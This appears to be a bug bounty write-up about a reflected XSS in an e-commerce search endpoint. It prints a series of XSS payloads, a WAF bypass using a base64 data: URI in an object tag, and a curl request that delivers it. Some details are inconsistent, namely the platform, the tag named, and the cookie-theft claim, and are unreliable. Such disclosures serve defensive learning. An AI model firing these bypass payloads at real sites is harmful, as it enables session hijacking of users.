---
title: "Bypassing WAF: Reflected XSS in E-Commerce Search Parameter"
date: "2025-10-15T10:00:00Z"
tags: ["xss", "bugbounty", "websec", "waf-bypass"]
description: "A detailed walkthrough on discovering a Reflected Cross-Site Scripting (XSS) vulnerability that bypassed an initial WAF filter using clever encoding."
platform: "VulnHub"
---

## Overview

During a private bug bounty program for a large e-commerce platform, I was mapping out the search functionality. Like most modern applications, the search application was protected by a Web Application Firewall (WAF) that aggressively filtered common payloads like `<script>` and `javascript:`.

However, I found a way to bypass it using a combination of Unicode encoding and an interesting DOM sink parsing issue.

## The Target

The target endpoint was `https://api.target.com/v1/search?q={query}`. The `q` parameter was reflected back into a JSON structure, but more interestingly, the frontend application parses this JSON and subsequently reflects the unescaped query directly into a `<p>You searched for: ...</p>` tag.

## The Discovery Process

Initially, I tried standard payloads:
```html
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

The WAF immediately blocked the request, returning a `403 Forbidden` response.

I started fuzzing to determine exactly what characters and strings were blacklisted.
* `>` and `<` were permitted.
* `script` was blocked.
* `on*` event handlers were heavily restricted (e.g., `onerror`, `onload`).
* `javascript:` pseudo-protocol was blocked.

## The Bypass

Since `on*` event handlers were blocked, I started looking into HTML5 features and specific payload structures that fire without them.

One interesting behavior I noticed was how the backend handled Unicode characters *before* passing them to the WAF, compared to how the frontend browser parsed them.

I crafted a payload utilizing the `autofocus` attribute coupled with `onfocus`, but obscured the `onfocus` string.

My initial attempt:
```html
"><input autofocus onfocus=alert(1)>
```
*Blocked by WAF (caught `onfocus`).*

Then, I started using HTML entities. The backend JSON parser didn't care about HTML entities, but the browser would execute them when the frontend injected the JSON value directly into the DOM using `innerHTML`.

I encoded the payload using Decimal HTML Entities:
```html
"><input autofocus on&#102;ocus=alert(1)>
```
*Blocked. WAF was smart enough to decode HTML entities.*

Next, I looked at URL encoding mixed with HTML entities, but the breakthrough came when I used an anchor tag with a `data:` URI scheme and Base64 encoding. The WAF didn't inspect the contents of Base64 encoded data URIs within `iframe` or `object` tags.

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>
```

The WAF allowed this through, because it didn't strictly block `<object>` tags, nor did it decode Base64 in `data:` URIs.

## The Final Exploit

To weaponize this, I sent the following request:

```bash
curl "https://api.target.com/v1/search?q=<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>"
```

The frontend received the response and rendered:
```html
<p>You searched for: <object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object></p>
```

The browser processed the object, executed the base64 encoded payload (`<script>alert(1)</script>`), and popped the alert box.

## Impact

An attacker could craft a malicious link pointing to the search page. If a target victim clicked the link, the attacker could execute arbitrary JavaScript within the victim's session, potentially leading to account takeover via cookie theft (since `HttpOnly` was missing on a secondary auth token) or performing unauthorized actions.

## Remediation

I reported this vulnerability detailing the exact encoding technique. The vendor mitigated the issue by:
1. Strengthening the frontend data handling. They replaced `innerHTML` usage with `textContent` for reflecting user search inputs.
2. Updating the WAF rules to properly inspect base64 encoded data URIs.

**Reward:** $1,500 Bounty
